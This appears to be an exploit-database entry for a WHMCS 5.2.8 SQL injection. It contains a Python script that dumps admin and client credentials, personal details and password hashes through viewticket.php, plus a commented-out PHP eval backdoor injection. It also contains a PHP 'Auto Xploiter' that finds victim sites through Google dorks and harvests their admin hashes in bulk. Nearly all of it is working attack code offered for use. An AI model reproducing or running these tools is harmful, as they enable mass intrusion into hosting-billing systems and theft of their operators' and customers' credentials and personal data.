@@ -1,0 +1,322 @@
+id: 21398
+date: 10/20/2013
+title: WHMCS 5.2.8 SQL Injection Vulnerability (0day)
+author: localhost.re
+cves: 
+
+#!/usr/bin/env python
+# 2013/10/18 - WHMCS <=5.2.8 SQL Injection
+# http://localhost.re/p/whmcs-528-vulnerability
+
+url = 'http://client.target.com/' 
+
+import urllib, re, sys
+from urllib2 import Request, urlopen
+ua = "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36"
+
+def exploit(sql):
+	sqlUnion = '-1 union select 1,0,0,0,0,0,0,0,0,0,0,%s,0,0,0,0,0,0,0,0,0,0,0#' % sql
+	print "Doing stuff: %s" % sqlUnion
+	#you could exploit any file that does a select, I randomly chose viewticket.php
+	r = urlopen(Request('%sviewticket.php' % url, data="tid[sqltype]=TABLEJOIN&tid[value]=%s" % sqlUnion, headers={"User-agent": ua})).read()
+	return re.search(r'<div class="clientmsg">(.*?)</div>', r, re.DOTALL).group(1).strip()
+
+#get admins
+print exploit('(SELECT GROUP_CONCAT(id,0x3a,username,0x3a,email,0x3a,password SEPARATOR 0x2c20) FROM tbladmins)')
+
+#get users
+count = int(exploit('(SELECT COUNT(id) FROM tblclients)'))
+print "User count %d" % count
+for i in range(count):	
+	print exploit('(SELECT CONCAT(id,0x3a,firstname,0x3a,lastname,0x3a,address1,0x3a,address2,0x3a,city,0x3a,country,0x3a,ip,0x3a,email,0x3a,password) FROM tblclients LIMIT %d,1)' % i)
+
+#are you evil? yes, you are!
+#php = "1';eval($_REQUEST['lol_whmcs']);#"
+#r = urlopen(Request('%sadmin/licenseerror.php?updatekey=true&whitelisted=1&newlicensekey=%s&match=1&username[sqltype]=TABLEJOIN&username[value]=-1||1=1%%23' % (url, urllib.quote_plus(php)), headers={"User-agent": ua})).read()
+
+
+--------------------------------------------------------------------------
+
+
+<?php
+/*
+*****************************************************
+        WHMCS 0day Auto Exploiter <= 5.2.8
+        Coded by g00n
+*****************************************************
+*/
+set_time_limit(0);
+ini_set('memory_limit', '64M');
+header('Content-Type: text/html; charset=UTF-8');
+function letItBy(){ ob_flush(); flush(); }
+function getAlexa($url)
+{
+    $xml = simplexml_load_file('http://data.alexa.com/data?cli=10&dat=snbamz&url='.$url);
+    $rank1 = $xml->SD[1];
+    if($rank1)
+        $rank = $rank1->POPULARITY->attributes()->TEXT;
+    else
+        $rank = 0;
+    return $rank;
+}
+    
+function google_that($query, $page=1)
+{
+    $resultPerPage=8;
+    $start = $page*$resultPerPage;
+    $url = "http://ajax.googleapis.com/ajax/services/search/web?v=1.0&hl=iw&rsz={$resultPerPage}&start={$start}&q=" . urlencode($query);
+    $resultFromGoogle = json_decode( http_get($url, true) ,true);
+    if(isset($resultFromGoogle['responseStatus'])) {
+        if($resultFromGoogle['responseStatus'] != '200') return false;
+        if(sizeof($resultFromGoogle['responseData']['results']) == 0) return false;
+        else return $resultFromGoogle['responseData']['results'];
+    }
+    else
+        die('The function <b>' . __FUNCTION__ . '</b> Kill me :( <br>' . $url );
+}
+    
+function http_get($url, $safemode = false){
+    if($safemode === true) sleep(1);
+    $im = curl_init($url);
+    curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
+    curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
+    curl_setopt($im, CURLOPT_HEADER, 0);
+    return curl_exec($im);
+    curl_close();
+}
+
+function check_vuln($url) {
+$url = dirname($url) . '/viewticket.php';
+$url = str_replace("/admin","",$url);
+
+$post = "tid[sqltype]=TABLEJOIN&tid[value]=-1 union select 1,0,0,0,0,0,0,0,0,0,0,(SELECT GROUP_CONCAT(0x3a3a3a3a3a,id,0x3a,username,0x3a,email,0x3a,password,0x3a3a3a3a3a​) FROM tbladmins),0,0,0,0,0,0,0,0,0,0,0#";
+$curl_connection = curl_init($url);
+if($curl_connection != false) {
+    curl_setopt($curl_connection, CURLOPT_CONNECTTIMEOUT, 30);
+    curl_setopt($curl_connection, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)");
+    curl_setopt($curl_connection, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl_connection, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($curl_connection, CURLOPT_FOLLOWLOCATION, 1);
+    curl_setopt($curl_connection, CURLOPT_POSTFIELDS, $post);
+    $source = curl_exec($curl_connection);
+    preg_match_all('/:::::(.*?):::::/s',$source,$infoz);
+    if($infoz[0]) {
+        return $infoz[0];
+    }
+    else
+        return "Fail!";
+}
+else
+    return "Fail!";
+}
+?>
+<html>
+<head>
+<title>WHMCS Auto Xploiter - by g00n</title>
+</head>
+<body style="background-image: url('http://i.imgur.com/zHNCk2e.gif'); background-repeat: repeat; background-position: center; background-attachment: fixed;">
+
+<STYLE>
+textarea{background-color:#105700;color:lime;font-weight:bold;font-size: 20px;font-family: Tahoma; border: 1px solid #000000;}
+input{FONT-WEIGHT:normal;background-color: #105700;font-size: 15px;font-weight:bold;color: lime; font-family: Tahoma; border: 1px solid #666666;height:20}
+body {
+font-family: Tahoma
+}
+tr {
+BORDER: dashed 1px #333;
+color: #FFF;
+}
+td {
+BORDER: dashed 1px #333;
+color: #FFF;
+}
+.table1 {
+BORDER: 0px Black;
+BACKGROUND-COLOR: Black;
+color: #FFF;
+}
+.td1 {
+BORDER: 0px;
+BORDER-COLOR: #333333;
+font: 7pt Verdana;
+color: Green;
+}
+.tr1 {
+BORDER: 0px;
+BORDER-COLOR: #333333;
+color: #FFF;
+}
+table {
+BORDER: dashed 1px #333;
+BORDER-COLOR: #333333;
+BACKGROUND-COLOR: Black;
+color: #FFF;
+}
+input {
+border            : dashed 1px;
+border-color        : #333;
+BACKGROUND-COLOR: Black;
+font: 8pt Verdana;
+color: Red;
+}
+select {
+BORDER-RIGHT:  Black 1px solid;
+BORDER-TOP:    #DF0000 1px solid;
+BORDER-LEFT:   #DF0000 1px solid;
+BORDER-BOTTOM: Black 1px solid;
+BORDER-color: #FFF;
+BACKGROUND-COLOR: Black;
+font: 8pt Verdana;
+color: Red;
+}
+submit {
+BORDER:  buttonhighlight 2px outset;
+BACKGROUND-COLOR: Black;
+width: 30%;
+color: #FFF;
+}
+textarea {
+border            : dashed 1px #333;
+BACKGROUND-COLOR: Black;
+font: Fixedsys bold;
+color: #999;
+}
+BODY {
+    SCROLLBAR-FACE-COLOR: Black; SCROLLBAR-HIGHLIGHT-color: #FFF; SCROLLBAR-SHADOW-color: #FFF; SCROLLBAR-3DLIGHT-color: #FFF; SCROLLBAR-ARROW-COLOR: Black; SCROLLBAR-TRACK-color: #FFF; SCROLLBAR-DARKSHADOW-color: #FFF
+margin: 1px;
+color: Red;
+background-color: Black;
+}
+.main {
+margin            : -287px 0px 0px -490px;
+BORDER: dashed 1px #333;
+BORDER-COLOR: #333333;
+}
+.tt {
+background-color: Black;
+}
+
+A:link {
+    COLOR: White; TEXT-DECORATION: none
+}
+A:visited {
+    COLOR: White; TEXT-DECORATION: none
+}
+A:hover {
+    color: Red; TEXT-DECORATION: none
+}
+A:active {
+    color: Red; TEXT-DECORATION: none
+}
+
+#result{margin:10px;}
+#result span{display:block;}
+#result .Y{background-color:green;}
+#result .X{background-color:red;}
+</STYLE>
+<script language=\'javascript\'>
+function hide_div(id)
+{
+  document.getElementById(id).style.display = \'none\';
+  document.cookie=id+\'=0;\';
+}
+function show_div(id)
+{
+  document.getElementById(id).style.display = \'block\';
+  document.cookie=id+\'=1;\';
+}
+function change_divst(id)
+{
+  if (document.getElementById(id).style.display == \'none\')
+    show_div(id);
+  else
+    hide_div(id);
+}
+</script>
+</td></table></tr>
+<br>
+<br>
+<link rel="stylesheet" type="text/css" href="http://fonts.googleapis.com/css?family=Audiowide">
+    <style>
+      body {
+        font-family: 'Audiowide', serif;
+        font-size: 30px;
+        
+      }
+    </style>
+  </head>
+
+  <body onLoad="type_text()" ; bgColor=#000000 text=#00FFFF background="Fashion fuchsia">
+    <center>
+<font face="Audiowide" color="red">WHMCS Auto Xploiter <font color="green">(0day)</font>
+<br>
+<font color="white" size="4">[For WHMCS ver. <= </font><font color="green" size="4">5.2.8</font><font color="white" size="4">]</font>
+</font>
+<br><br>
+
+<table border=1 bordercolor=red>
+<tr>
+<td width="700">
+<br />
+<center>
+    <form method="post">
+        Google Dork: &nbps;&nbps;
+        <input type="text" id="dork" size="30" name="dork" value="<?php echo (isset($_POST['dork']{0})) ? htmlentities($_POST['dork']) : 'inurl:submitticket.php'; ?>" />
+        &nbps;&nbps;<input type="submit" value="Xploit!" id="button"/>
+    </form>
+<?php
+    if(isset($_POST['dork']{0})) {
+        $file = fopen("WMCS-Hashes.txt","a");
+        echo '<br /><div id="result"><b>Scanning has been started... Good luck! ;)</b><br><br>';            
+        letItBy();            
+        for($googlePage = 1; $googlePage <= 50; $googlePage++) {
+            $googleResult = google_that($_POST['dork'], $googlePage);
+            if(!$googleResult) {
+                echo 'Finished scanning.';
+                fclose($file);
+                break;
+            }
+            
+            for($victim = 0; $victim < sizeof($googleResult); $victim++){
+                $result = check_vuln($googleResult[$victim]['unescapedUrl']);
+                $alexa = getAlexa($googleResult[$victim]['unescapedUrl']);
+                if($result != "Fail!") {
+                    $hashes = "";
+                    foreach ($result as $record) {
+                        $hashes = $hashes . str_replace(':::::','',$record) . "\n";
+                    }
+                    $sep = "========================================================\n";
+                    $data = $sep . $googleResult[$victim]['unescapedUrl'] . " - Alexa: " .$alexa. "\n" . $sep . $hashes . "\n";
+                    fwrite($file,$data);
+                    echo "<br /><font color=\"green\">Successfully Xploited...</font>";
+                    echo '<span class="Y">';
+                    echo "<pre>" . $data . "</pre></span><br />";
+                    
+                }
+                else {
+                echo '<span class="X">';
+                echo "<a href=\"{$googleResult[$victim]['unescapedUrl']}\" target='_blank'>{$googleResult[$victim]['titleNoFormatting']}</a> - <font color=\"black\">Failed!</font>";
+                echo "</span>\n<br />";
+                }
+                letItBy();
+            }
+        }
+        echo '</div>';
+    }
+?>
+</center>
+</td>
+</table>
+<br /><br />
+<font face="Audiowide" color="red" size="2">
+Coded by: <font color="white">g00n</font> <font color="white">|</font> Skype: <font color="white"><a href="Skype:t3hg00n">t3hg00n</a></font><br /><br />
+<br > <font color="green">For more tools/scripts/exploits/etc.</font>
+<br />visit <a href="http://xploiter.net" target="_blank" style="text-decoration: none;">www.Xploiter.net</a>
+</font>
+
+</center>
+</body>
+</html>
+
+#  0day.today [2023-03-22]  #
